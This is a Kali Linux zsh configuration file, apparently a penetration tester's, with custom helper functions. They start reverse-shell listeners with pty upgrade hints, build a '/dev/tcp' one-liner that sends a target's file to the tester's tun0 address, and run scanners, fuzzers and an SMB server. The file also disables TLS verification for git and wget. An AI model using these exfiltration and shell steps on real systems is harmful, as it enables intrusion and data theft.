# ~/.zshrc file for zsh interactive shells.
# see /usr/share/doc/zsh/examples/zshrc for examples

setopt autocd              # change directory just by typing its name
#setopt correct            # auto correct mistakes
setopt interactivecomments # allow comments in interactive mode
setopt magicequalsubst     # enable filename expansion for arguments of the form ‘anything=expression’
setopt nonomatch           # hide error message if there is no match for the pattern
setopt notify              # report the status of background jobs immediately
setopt numericglobsort     # sort filenames numerically when it makes sense
setopt promptsubst         # enable command substitution in prompt

WORDCHARS=${WORDCHARS//\/} # Don't consider certain characters part of the word

# hide EOL sign ('%')
PROMPT_EOL_MARK=""

# configure key keybindings
bindkey -e                                        # emacs key bindings
bindkey ' ' magic-space                           # do history expansion on space
bindkey '^[[3;5~' kill-word                       # ctrl + Supr
bindkey '^[[3~' delete-char                       # delete
bindkey '^[[1;5C' forward-word                    # ctrl + ->
bindkey '^[[1;5D' backward-word                   # ctrl + <-
bindkey '^[[5~' beginning-of-buffer-or-history    # page up
bindkey '^[[6~' end-of-buffer-or-history          # page down
bindkey '^[[H' beginning-of-line                  # home
bindkey '^[[F' end-of-line                        # end
bindkey '^[[Z' undo                               # shift + tab undo last action

# enable completion features
autoload -Uz compinit
compinit -d ~/.cache/zcompdump
zstyle ':completion:*:*:*:*:*' menu select
zstyle ':completion:*' auto-description 'specify: %d'
zstyle ':completion:*' completer _expand _complete
zstyle ':completion:*' format 'Completing %d'
zstyle ':completion:*' group-name ''
zstyle ':completion:*' list-colors ''
zstyle ':completion:*' list-prompt %SAt %p: Hit TAB for more, or the character to insert%s
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'
zstyle ':completion:*' rehash true
zstyle ':completion:*' select-prompt %SScrolling active: current selection at %p%s
zstyle ':completion:*' use-compctl false
zstyle ':completion:*' verbose true
zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'

# History configurations
HISTFILE=~/.zsh_history
HISTSIZE=1000
SAVEHIST=2000
setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
setopt hist_ignore_dups       # ignore duplicated commands history list
setopt hist_ignore_space      # ignore commands that start with space
setopt hist_verify            # show command with history expansion to user before running it
#setopt share_history         # share command history data

# force zsh to show the complete history
alias history="history 0"

# configure `time` format
TIMEFMT=$'\nreal\t%E\nuser\t%U\nsys\t%S\ncpu\t%P'

# make less more friendly for non-text input files, see lesspipe(1)
#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

configure_prompt() {
    prompt_symbol=🦠
    [ "$EUID" -eq 0 ] && prompt_symbol=💀
    case "$PROMPT_ALTERNATIVE" in
        twoline)
            PROMPT=$'%F{%(#.blue.green)}┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n$prompt_symbol%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '
            RPROMPT=$'%(?.. %? %F{red}%B⨯%b%F{reset})%(1j. %j %F{yellow}%B⚙%b%F{reset}.)'
            ;;
        oneline)
            PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{%(#.red.blue)}%n@%m%b%F{reset}:%B%F{%(#.blue.green)}%~%b%F{reset}%(#.#.$) '
            RPROMPT=
            ;;
        backtrack)
            PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{red}%n@%m%b%F{reset}:%B%F{blue}%~%b%F{reset}%(#.#.$) '
            RPROMPT=
            ;;
    esac
}

# The following block is surrounded by two delimiters.
# These delimiters must not be modified. Thanks.
# START KALI CONFIG VARIABLES
PROMPT_ALTERNATIVE=twoline
NEWLINE_BEFORE_PROMPT=yes
# STOP KALI CONFIG VARIABLES

if [ "$color_prompt" = yes ]; then
    # override default virtualenv indicator in prompt
    VIRTUAL_ENV_DISABLE_PROMPT=1

    configure_prompt

    # enable syntax-highlighting
    if [ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ] && [ "$color_prompt" = yes ]; then
        . /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
        ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)
        ZSH_HIGHLIGHT_STYLES[default]=none
        ZSH_HIGHLIGHT_STYLES[unknown-token]=fg=red,bold
        ZSH_HIGHLIGHT_STYLES[reserved-word]=fg=cyan,bold
        ZSH_HIGHLIGHT_STYLES[suffix-alias]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[global-alias]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[precommand]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[commandseparator]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[autodirectory]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[path]=underline
        ZSH_HIGHLIGHT_STYLES[path_pathseparator]=
        ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]=
        ZSH_HIGHLIGHT_STYLES[globbing]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[history-expansion]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[command-substitution]=none
        ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[process-substitution]=none
        ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[back-quoted-argument]=none
        ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[rc-quote]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[assign]=none
        ZSH_HIGHLIGHT_STYLES[redirection]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[comment]=fg=black,bold
        ZSH_HIGHLIGHT_STYLES[named-fd]=none
        ZSH_HIGHLIGHT_STYLES[numeric-fd]=none
        ZSH_HIGHLIGHT_STYLES[arg0]=fg=green
        ZSH_HIGHLIGHT_STYLES[bracket-error]=fg=red,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-1]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-2]=fg=green,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-3]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-4]=fg=yellow,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-5]=fg=cyan,bold
        ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]=standout
    fi
else
    PROMPT='${debian_chroot:+($debian_chroot)}%n@%m:%~%# '
fi
unset color_prompt force_color_prompt

toggle_oneline_prompt(){
    if [ "$PROMPT_ALTERNATIVE" = oneline ]; then
        PROMPT_ALTERNATIVE=twoline
    else
        PROMPT_ALTERNATIVE=oneline
    fi
    configure_prompt
    zle reset-prompt
}
zle -N toggle_oneline_prompt
bindkey ^P toggle_oneline_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*|Eterm|aterm|kterm|gnome*|alacritty)
    TERM_TITLE=$'\e]0;${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%n@%m: %~\a'
    ;;
*)
    ;;
esac

precmd() {
    # Print the previously configured title
    print -Pnr -- "$TERM_TITLE"

    # Print a new line before the prompt, but only if it is not the first line
    if [ "$NEWLINE_BEFORE_PROMPT" = yes ]; then
        if [ -z "$_NEW_LINE_BEFORE_PROMPT" ]; then
            _NEW_LINE_BEFORE_PROMPT=1
        else
            print ""
        fi
    fi
}

# enable color support of ls, less and man, and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
    alias diff='diff --color=auto'
    alias ip='ip --color=auto'

    export LESS_TERMCAP_mb=$'\E[1;31m'     # begin blink
    export LESS_TERMCAP_md=$'\E[1;36m'     # begin bold
    export LESS_TERMCAP_me=$'\E[0m'        # reset bold/blink
    export LESS_TERMCAP_so=$'\E[01;33m'    # begin reverse video
    export LESS_TERMCAP_se=$'\E[0m'        # reset reverse video
    export LESS_TERMCAP_us=$'\E[1;32m'     # begin underline
    export LESS_TERMCAP_ue=$'\E[0m'        # reset underline

    # Take advantage of $LS_COLORS for completion as well
    zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
    zstyle ':completion:*:*:kill:*:processes' list-colors '=(#b) #([0-9]#)*=0=01;31'
fi

# some more ls aliases
alias ll='ls -l'
alias la='ls -A'
alias l='ls -CF'

# enable auto-suggestions based on the history
if [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
    . /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
    # change suggestion color
    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#999'
fi

# enable command-not-found if installed
if [ -f /etc/zsh_command_not_found ]; then
    . /etc/zsh_command_not_found
fi


# ====================================================( Edit by h4rithd.com )========================== 
# sudo apt-get install cmatrix
#cmatrix  -r -s # matrix banner

export GIT_SSL_NO_VERIFY=1
export PATH="$HOME/.local/bin:$PATH"
export PIP_DISABLE_PIP_VERSION_CHECK=1
export SUDO_PROMPT='[!] Give me the password 🔐: '
export rockyou="/usr/share/wordlists/rockyou.txt"
export mwords="/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"
export mfiles="/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt"
export mlwords="/usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt"
export mlfiles="/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt"
export dnsl="/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"
export dnsm="/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"
export dnsf="/usr/share/seclists/Discovery/DNS/fierce-hostlist.txt"
export dnsj="/usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt"

# sudo apt install source-highlight
if [[ -f /usr/share/source-highlight/src-hilite-lesspipe.sh ]]; then
	export LESSOPEN="| /usr/share/source-highlight/src-hilite-lesspipe.sh %s"
	export LESS=' -R '
fi

[[ -f ~/.fzf.zsh ]] && source ~/.fzf.zsh
[[ -s "/etc/grc.zsh" ]] && source /etc/grc.zsh

xtar(){
  if [ -f $1 ] ; then
    case $1 in
      *.Z)         uncompress $1;;
      *.gz)        gunzip $1    ;;
      *.7z)        7z x $1      ;;
      *.deb)       ar x $1      ;;
      *.tgz)       tar xzf $1   ;;
      *.zip)       unzip $1     ;;
      *.bz2)       bunzip2 $1   ;;
      *.rar)       unrar x $1   ;;
      *.tar)       tar xf $1    ;;
      *.tbz2)      tar xjf $1   ;;
      *.tar.xz)    tar xf $1    ;;
      *.tar.gz)    tar xzf $1   ;;
      *.tar.bz2)   tar xjf $1   ;;
      *.tar.zst)   unzstd $1    ;;      
      *)           echo "'$1' cannot be extracted !" ;;
    esac
  else
    echo "'$1' is not a valid file !"
  fi
}

# sudo apt-get instal wmctrl
openvpn(){
    [[ -f /usr/bin/wmctrl ]] && wmctrl -r "Terminal" -e 2,136,20,1699,963
    sudo /usr/sbin/openvpn "$@"
}

upnginx(){
    mkdir -p /tmp/uploads
    chmod 777 /tmp/uploads/
    chown h4rithd:h4rithd /tmp/uploads/
    sudo systemctl start nginx
}

# sudo apt-get install xclip
pserver(){
    clear 
    echo "-------------------------" 
    ls
    echo ""
    ip addr show | grep 'global tun0' | grep -o '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*' | xargs echo -n | DISPLAY=:0 xclip -sel clip
    python3 -m http.server 80
}

sserver(){
    ip addr show | grep 'global tun0' | grep -o '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*' | xargs -I {} echo -n "\\\\{}\share\\" | DISPLAY=:0 xclip -sel clip
    impacket-smbserver share . "$@"
}

penv(){
    case $1 in
        "2") virtualenv -p python2 venv ;;
        "")  virtualenv -p python venv ;;
    esac
    source venv/bin/activate
}

ncl(){
    port=4545
    [[ ! -z "$1" ]] && port=$1
    echo "[command:] script -qc /bin/bash /dev/null"
    echo "[command:] python -c \"import pty;pty.spawn('/bin/bash')\""
    echo "[command:] python3 -c \"import pty;pty.spawn('/bin/bash')\""
    nc -lvnp $port 
}

nclr(){
    port=4545
    [[ ! -z "$1" ]] && port=$1
    rlwrap nc -lvnp $port 
}

nget(){
    echo "cat $1 > /dev/tcp/$(ip addr show | grep 'global tun0' | grep -o '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*')/1212"| xargs echo -n | DISPLAY=:0 xclip -sel clip
    echo "[command:] nc -lvnp 1212 > " $1
    nc -lvnp 1212 > $1 
}

sty(){
    echo "[command:] export TERM=xterm;stty rows 45 cols 173" 
    stty raw -echo; fg; echo "\n"; echo "\n"
}

scanall(){
    [[ ! -d  nmap ]] && mkdir nmap
    sudo grc nmap -n -Pn -vv --open -T4 -p- -oA nmap/AllPorts "$@" ; notify-send -i nmap 'TCP All Ports Scan' 'is finished!'
}

scannow(){
    [[ ! -d  nmap ]] && echo 'First run scanall !'
    ports=$(cat nmap/AllPorts.nmap | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
    sudo grc nmap -sV -sC -Pn -oA nmap/DetailPorts -p $ports "$@" ; notify-send -i nmap 'Script Scan' 'is finished!'
}

scanudpall(){
    [[ ! -d  nmap ]] && mkdir nmap
    sudo grc nmap -n -Pn -vv -sU -p- -oA nmap/UDPAllPorts "$@" ; notify-send -i nmap 'UDP All Ports Scan' 'is finished!'
}

scanudpfast(){
    [[ ! -d  nmap ]] && mkdir nmap
    sudo grc nmap -n -Pn -sUV -T4 -F -vv --version-intensity 0 -oA nmap/UDPFastPorts "$@" ; notify-send -i nmap 'UDP Fast Scan' 'is finished!'
}

scanudpbest(){
    [[ ! -d  nmap ]] && mkdir nmap
    sudo grc nmap -n -Pn -vv -sUV -p 53,67,69,111,123,135,137,138,161,177,445,500,631,623,1434,1900,4500 -oA nmap/UDPBestPorts "$@" ; notify-send -i nmap 'Best UDP Scan' 'is finished!' 
}

scandir(){
    [[ ! -d  fuzz ]] && mkdir fuzz
    if [[ -f $(pwd)/fuzz/gobuster.txt ]]
    then
        outfile=''
        echo "[!] gobuster.txt file alrady exists.."
        vared -p '[+] Please give new name (gobuster-<name>.txt): ' outfile 
        grc gobuster dir -e -f -t 20 -k -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o fuzz/gobuster-$outfile.txt "$@" ; notify-send -i dirbuster 'Gobuster scan' 'is finished!'
    else
        grc gobuster dir -e -f -t 20 -k -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o fuzz/gobuster.txt "$@" ; notify-send -i dirbuster 'Gobuster scan' 'is finished!'
    fi
}

dirsearch(){
    [[ ! -d  fuzz ]] && mkdir fuzz
    if [[ -f $(pwd)/fuzz/dirsearch.txt ]]
    then
        outfile=''
        echo "[!] dirsearch.txt file alrady exists.."
        vared -p '[+] Please give new name (dirsearch-<name>.txt): ' outfile 
        python3 -W ignore /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -r -f -o $(pwd)/fuzz/dirsearch-$outfile.txt --format=plain --full-url --random-agent -e php,txt,html "$@" ; notify-send -i dirbuster 'Dirsearch Scan' 'is finished!'
    else
        python3 -W ignore /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -r -f -o $(pwd)/fuzz/dirsearch.txt --format=plain --full-url --random-agent -e php,txt,html "$@" ; notify-send -i dirbuster 'Dirsearch Scan' 'is finished!'
    fi
}

ffuf(){
    [[ ! -d  fuzz ]] && mkdir fuzz
    if [[ -f $(pwd)/fuzz/ffuf.txt ]]
    then
        outfile=''
        echo "[!] ffuf.txt file alrady exists.."
        vared -p '[+] Please give new name (fuff-<name>.txt): ' outfile 
        /usr/bin/ffuf -c -ic -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1' -mc all "$@" | tee fuzz/ffuf-$outfile.txt ; notify-send -i ffuf 'ffuf scan' 'is finished!'
    else
        /usr/bin/ffuf -c -ic -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1' -mc all "$@" | tee fuzz/ffuf.txt ; notify-send -i ffuf 'ffuf scan' 'is finished!'
    fi
}

mwfuzz(){
    [[ ! -d  fuzz ]] && mkdir fuzz
    if [[ -f $(pwd)/fuzz/wfuzz.txt ]]
    then
        outfile=''
        echo "[!] wfuzz.txt file alrady exists.."
        vared -p '[+] Please give new name (wfuzz-<name>.txt): ' outfile 
        /usr/local/bin/wfuzz -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1' -c -f fuzz/wfuzz-$outfile.txt,raw "$@" ; notify-send -i wfuzz 'wfuzz Scan' 'is finished!'
    else
        /usr/local/bin/wfuzz -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1' -c -f fuzz/wfuzz.txt,raw "$@" ; notify-send -i wfuzz 'wfuzz Scan' 'is finished!'
    fi
}

proxy(){how
## https://github.com/tnpitsecurity/ligolo-ng
    if [ ! -f $1 ] ; then
        sudo ip tuntap add user $USER mode tun ligolo
        sudo ip link set ligolo up
        /home/$USER/.local/bin/proxy -selfcert
    else
        /home/$USER/.local/bin/proxy -selfcert
    fi
}

ntlm_hash(){
    iconv -f ASCII -t UTF-16LE <(printf "$1") | openssl dgst -md4
}

alias ..="cd .."
alias pip="pip3"
alias ps="ps auxf"
alias bcat="batcat"
alias ...="cd ../../"
alias ccat="/usr/bin/cat"
alias nmap="sudo grc nmap"
alias tb="nc termbin.com 9999"
alias myip="curl ifconfig.ovh"
alias wireshark="sudo wireshark"
alias sqlmap="sqlmap --random-agent"
alias copy="DISPLAY=:0 xclip -sel clip"
alias wpr="cd /opt/PrviEsc/WinPrviEsc/"
alias wget="grc wget --no-check-certificate"
alias lpr="cd /opt/PrviEsc/LinPrviEsc/scripts/"
alias csrfb33f="/opt/MyTools/csrfb33f/csrfb33f.py"
alias crunch3r="/opt/MyTools/cruNch3r/cruNch3r.py"
alias cat="batcat --style='plain' --theme=TwoDark"
alias imp-fuzzer="/opt/MyTools/imp-fuzzer/imp-fuzzer.py"
alias gsize="du -hac --max-depth=1 2>/dev/null | sort -h"
